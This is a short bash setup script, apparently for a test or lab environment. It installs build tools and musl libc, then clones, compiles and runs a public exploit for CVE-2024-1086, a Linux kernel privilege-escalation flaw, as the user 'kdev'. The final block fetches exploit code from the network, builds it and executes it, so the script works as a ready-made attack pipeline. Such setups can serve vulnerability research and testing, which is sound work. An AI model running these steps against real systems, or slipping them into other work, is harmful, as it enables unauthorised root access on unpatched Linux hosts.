#!/bin/bash

set -e

dnf install -y git make wget tar gcc
dnf clean all
rm -rf /var/cache/yum

MUSL_VERSION="1.2.5"
MUSL_ROOT="/opt/app/musl"

mkdir -p $MUSL_ROOT
cd $MUSL_ROOT

wget https://www.musl-libc.org/releases/musl-$MUSL_VERSION.tar.gz
tar -xzf musl-$MUSL_VERSION.tar.gz
cd musl-$MUSL_VERSION
./configure
make
make install

cd /opt/app
rm -rf $MUSL_ROOT

export PATH="/usr/local/musl/bin:${PATH}"
echo 'export PATH="/usr/local/musl/bin:${PATH}"' >> ~/.bashrc

APP_ROOT="/opt/app"
CVE_DIR="$APP_ROOT/CVE-2024-1086"

mkdir -p $APP_ROOT

git clone https://github.com/Notselwyn/CVE-2024-1086.git $CVE_DIR
chown -R kdev:kdev $CVE_DIR
cd $CVE_DIR
make -j$(nproc)

ls -alh exploit
chmod 755 exploit
sudo -u kdev -H bash -c "exploit"

